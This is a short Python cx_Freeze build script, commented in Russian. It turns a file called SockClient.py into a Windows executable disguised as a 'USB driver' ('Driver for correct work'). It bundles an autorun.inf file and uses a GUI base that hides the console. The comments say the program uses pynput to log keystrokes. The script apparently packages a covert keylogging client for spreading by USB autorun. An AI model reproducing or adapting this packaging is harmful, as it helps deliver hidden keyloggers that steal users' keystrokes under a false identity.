import sys
from cx_Freeze import *

if __name__ == '__main__':
    """
    Эта программа делает конвертирование в exe с заданными параметрами, можно проще, но попробуем и через нее.
    Запускать программу надо с cmd, Pycharm сыпит ошибки. Запуск с параметром: python3 setup_exe.py build. Для перезаписи
    билда просто удалить папку build и запустить скрипт заново.
    ВАЖНО (!)
    Данная библиотека ругалась на импортированную мной pynput для логирования нажатий. Попробовать собрать билд стандартным способом.  
    """
    #укажем билдеру что нам нужен файл авторана
    include_files = ["autorun.inf"]

    #Проверяем версию ОС, если вин 32 то указываем базу вин32, если нет то по умолчанию 64.
    if sys.platform == "win32":
        base = "Win32GUI"
    else:
        base = None

    #делаем сетап для билда нашего exe, даем имя, версию и описание произвольно
    #потом говорим что нам надо exe файл (build_exe), который должен включать файлы: include_files
    #далее говорим как назвать файл и с какой базой (32 или 64)
    setup(name="USB driver",
          version="1",
          description="Driver for correct work",
          options={"build_exe": {"include_files": include_files}},
          executables = [Executable("SockClient.py", base=base)]
          )